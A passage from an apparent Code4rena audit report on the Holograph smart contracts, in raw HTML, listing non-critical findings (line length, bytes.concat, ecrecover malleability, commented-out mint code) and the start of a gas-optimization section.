width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[20] Lines are too long</h2>\n<p>Usually lines in source code are limited to 80 characters. Today’s screens are much larger so it’s reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over 164 characters, the lines below should be split when they reach that length\nReference: <a href=\"https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length\">https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length</a></p>\n<h2 id=\"21-use-bytesconcat\" style=\"position:relative;\"><a href=\"#21-use-bytesconcat\" aria-label=\"21 use bytesconcat permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[21] Use <code>bytes.concat()</code></h2>\n<p>Solidity version 0.8.4 introduces <code>bytes.concat()</code> (vs <code>abi.encodePacked(&#x3C;bytes>,&#x3C;bytes>)</code>)</p>\n<h3 id=\"recommended-mitigation-steps-39\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-39\" aria-label=\"recommended mitigation steps 39 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use <code>bytes.concat()</code> and upgrade to at least Solidity version 0.8.4 if required. </p>\n<h2 id=\"22-use-of-ecrecover-is-susceptible-to-signature-malleability\" style=\"position:relative;\"><a href=\"#22-use-of-ecrecover-is-susceptible-to-signature-malleability\" aria-label=\"22 use of ecrecover is susceptible to signature malleability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[22] Use of <code>ecrecover</code> is susceptible to signature malleability</h2>\n<p>The built-in EVM precompile <code>ecrecover</code> is susceptible to signature malleability, which could lead to replay attacks.<br>\nReferences:  <a href=\"https://swcregistry.io/docs/SWC-117\">https://swcregistry.io/docs/SWC-117</a>,  <a href=\"https://swcregistry.io/docs/SWC-121\">https://swcregistry.io/docs/SWC-121</a>, and  <a href=\"https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57.\">https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57.</a><br>\nWhile this is not immediately exploitable, this may become a vulnerability if used elsewhere.</p>\n<h3 id=\"recommended-mitigation-steps-40\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-40\" aria-label=\"recommended mitigation steps 40 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using OpenZeppelin’s ECDSA library (which prevents this malleability) instead of the built-in function.</p>\n<h2 id=\"23-commented-code\" style=\"position:relative;\"><a href=\"#23-commented-code\" aria-label=\"23 commented code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[23] Commented code</h2>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  //   function sourceMintBatch(address to, uint224[] calldata tokenIds) external onlySource {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     require(tokenIds.length &lt; 1000, &quot;ERC721: max batch size is 1000&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     uint32 chain = _chain();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     uint256 token;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       require(!_burnedTokens[token], &quot;ERC721: can&#39;t mint burned token&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       token = uint256(bytes32(abi.encodePacked(chain, tokenIds[i])));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       require(!_burnedTokens[token], &quot;ERC721: can&#39;t mint burned token&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       _mint(to, token);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //   }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @dev Allows for source smart contract to mint a batch of tokens.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //   function sourceMintBatch(address[] calldata wallets, uint224[] calldata tokenIds) external onlySource {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     require(wallets.length == tokenIds.length, &quot;ERC721: array length missmatch&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     require(tokenIds.length &lt; 1000, &quot;ERC721: max batch size is 1000&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     uint32 chain = _chain();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     uint256 token;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       token = uint256(bytes32(abi.encodePacked(chain, tokenIds[i])));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       require(!_burnedTokens[token], &quot;ERC721: can&#39;t mint burned token&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       _mint(wallets[i], token);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //   }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   * @dev Allows for source smart contract to mint a batch of tokens.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //   function sourceMintBatchIncremental(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     uint224 startingTokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     uint256 length</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //   ) external onlySource {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     uint32 chain = _chain();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     uint256 token;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       token = uint256(bytes32(abi.encodePacked(chain, startingTokenId)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       require(!_burnedTokens[token], &quot;ERC721: can&#39;t mint burned token&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       _mint(to, token);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //       startingTokenId++;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  //   }</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/enforcer/HolographERC721.sol#L527-L570\">https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/enforcer/HolographERC721.sol#L527-L570</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/68#issuecomment-1309431800\">alexanderattar (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Well done!</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 99 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/313\">report highlighted below</a> by <strong>oyc_109</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/16\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/69\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/72\">RedOneN</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/140\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/272\">karanctf</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/301\">Diana</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/305\">Yiko</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/350\">halden</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/425\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/428\">ajtra</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/429\">m_Rassska</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/2\">leosathya</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/18\">durianSausage</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/21\">Mathieu</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/38\">gianganhnguyen</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/47\">gogo</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/49\">KoKo</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/59\">Satyam_Sharma</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/75\">Picodes</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/101\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/114\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/116\">mcwildy</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/127\">exolorkistis</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/128\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/131\">Saintcode_</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/132\">sakman</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/136\">zishansami</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/150\">0xsam</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/152\">ret2basic</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/158\">saneryee</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/192\">Jujic</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/226\">erictee</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/258\">vv7</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/267\">iepathos</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/278\">Shinchan</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/285\">martin</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/298\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/308\">Mukund</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/311\">cryptostellar5</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/315\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/316\">hxzy</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/328\">Waze</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/329\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/343\">Tomio</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/356\">svskaushik</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/360\">Pheonix</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/362\">Dinesh11G</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/370\">JrNet</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/371\">B2</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/376\">ryshaw</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/380\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/391\">i_got_hacked</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/392\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/399\">Metatron</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/416\">peiw</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/419\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/484\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/499\">JC</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/6\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/11\">ballx</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/23\">cdahlheimer</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/37\">dharma09</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/56\">beardofginger</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/58\">skyle</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/79\">aysha</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/86\">bobirichman</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/89\">mics</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/90\">sikorico</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/94\">Tagir2003</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/125\">emrekocak</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/126\">2997ms</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/134\">0xzh</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/139\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/157\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/166\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/193\">w0Lfrum</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/210\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/225\">0xZaharina</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/238\">catwhiskeys</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/266\">catchup</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/274\">0x5rings</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/318\">peanuts</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/344\">Olivierdem</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/354\">bulej93</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/359\">Amithuddar</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/372\">djxploit</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/398\">sakshamguruji</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/406\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/409\">0x040</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/423\">nicobevi</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/424\">tnevler</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/436\">lyncurion</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/465\">cylzxje</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/479\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/481\">lucacez</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/482\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/487\">d3e4</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/496\">brgltd</a>.</em></p>\n<h2 id=\"g-01-dont-initialize-variables-with-default-value\" style=\"position:relative;\"><a href=\"#g-01-dont-initialize-variables-with-default-value\" aria-label=\"g 01 dont initialize variables with default value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Don’t Initialize Variables with Default Value</h2>\n<p>Uninitialized variables are assigned with the types default value. Explicitly initializing a variable with it’s default value costs unnecesary gas.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::380 =&gt; uint256 fee = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::310 =&gt; uint256 gasLimit = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::311 =&gt; uint256 gasPrice = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::781 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 =&gt; for (uint256 i = 0; i &lt; wallets.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::357 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::716 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::307 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::323 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::340 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::356 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::394 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::414 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::432 =&gt; for (uint256 t = 0; t &lt; tokenAddresses.length; t++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::437 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::454 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::474 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span></code></pre>\n<h2 id=\"g-02-cache-array-length-outside-of-loop\" style=\"position:relative;\"><a href=\"#g-02-cache-array-length-outside-of-loop\" aria-label=\"g 02 cache array length outside of loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Cache Array Length Outside of Loop</h2>\n<p>Caching the array length outside a loop saves reading it on each iteration, as long as the array’s length is not changed during the loop.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::871 =&gt; for (uint256 i = _operatorPods.length; i &lt;= pod; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 =&gt; for (uint256 i = 0; i &lt; wallets.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::432 =&gt; for (uint256 t = 0; t &lt; tokenAddresses.length; t++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::437 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::454 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::474 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span></code></pre>\n<h2 id=\"g-03-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\" style=\"position:relative;\"><a 